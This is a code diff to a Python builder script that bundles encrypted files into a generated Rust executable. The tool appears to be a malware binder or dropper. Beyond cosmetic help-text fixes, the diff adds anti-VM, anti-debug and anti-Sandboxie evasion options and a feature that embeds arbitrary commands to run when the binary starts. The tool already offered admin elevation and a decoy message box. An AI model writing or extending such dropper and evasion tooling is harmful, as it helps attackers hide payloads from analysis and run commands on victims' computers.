@@ -105,12 +105,12 @@ def main() -> int:
                       default=False)
 
   parser.add_argument('-V', '--verbose',
-                      help='Enables verbose mode (Prints exceptions, current steps)',
+                      help='Enables verbose mode (prints exceptions, current steps)',
                       action='store_true',
                       default=False)
 
   parser.add_argument('-f', '--file',
-                      help='Path to the file(s) to join (Can be multiple)',
+                      help='Path to the file(s) to join (can be multiple)',
                       action='append',
                       required=True)
 
@@ -119,7 +119,7 @@ def main() -> int:
                       action='store_true')
 
   parser.add_argument('-M', '--msgbox',
-                      help='Shows messagebox (You need also provide -m, -T argument)',
+                      help='Shows messagebox (you need also provide -m, -T argument)',
                       action='store_true')
 
   parser.add_argument('-m', '--message',
@@ -131,8 +131,24 @@ def main() -> int:
                       default=None)
   
   parser.add_argument('-I', '--mbox-icon-type',
-                      help='Set icon type of messagebox (Available: error, info. By default: error)',
+                      help='Set icon type of messagebox (available: error, info. By default: error)',
                       default='error')
+
+  parser.add_argument('--anti-vm',
+                      help='Enables Anti-VM (only x86)',
+                      action='store_true')
+  
+  parser.add_argument('--anti-debug',
+                      help='Enables Anti-Debug (available only for Linux builds!) (only x86)',
+                      action='store_true')
+
+  parser.add_argument('--anti-sandboxie',
+                      help='Enables Anti-Sandboxie (only Windows)',
+                      action='store_true')
+
+  parser.add_argument('-c', '--command',
+                      help='Commands to execute when runned (by default is doesn\'t run any. Can be multiple)',
+                      action='append',)
 
   args = parser.parse_args()
 
@@ -168,6 +184,9 @@ def main() -> int:
     if args.icon is not None: features.append('icon')
     if args.admin: features.append('admin')
     if args.yes_console: features.append('enable_win_console')
+    if args.anti_vm: features.append('anti_vm')
+    if args.anti_debug: features.append('anti_debug')
+    if args.anti_sandboxie: features.append('anti_sandboxie')
     if args.msgbox:
       features.append('show_messagebox')
 
@@ -264,7 +283,7 @@ def main() -> int:
 
     # generate code to generate code xD
     printv('Generating code')
-    gen_code = '\n '.join([f'match read_n_encrypt_file("{f}", &key) {{\n    Some(r) => {{ code_vec.push(r); }}\n    None => {{ println!("Cannot add file {f}"); }}\n  }}' for f in files_to_include])
+    gen_code = '\n    '.join([f'match read_n_encrypt_file("{f}", &key) {{\n        Some(r) => {{ code_vec.push(r); }}\n        None => {{ println!("Cannot add file {f}"); }}\n    }}' for f in files_to_include])
     with open('build.rs', 'r') as f:
       build_rs_content = f.read()
     
@@ -274,6 +293,19 @@ def main() -> int:
       build_rs_content = build_rs_content.replace('--msgbox-title-build--', args.title) \
                                          .replace('--msgbox-text-build--', args.message) \
                                          .replace('--msgbox-type-build--', args.mbox_icon_type.lower().capitalize())
+
+    # generating code for commands (if any)
+    if args.command is not None:
+      printv('Generating code for commands')
+
+      commands_code = []
+
+      for c in args.command:
+        command_code = 'code_vec.push(add_command("{0}"));'.format(c.replace("\\", "\\\\"))
+
+        commands_code.append(command_code)
+      
+      gen_code += '\n    '+'\n    '.join(commands_code)
 
     printv('Writing generated code')
     with open('build.rs', 'w') as f:
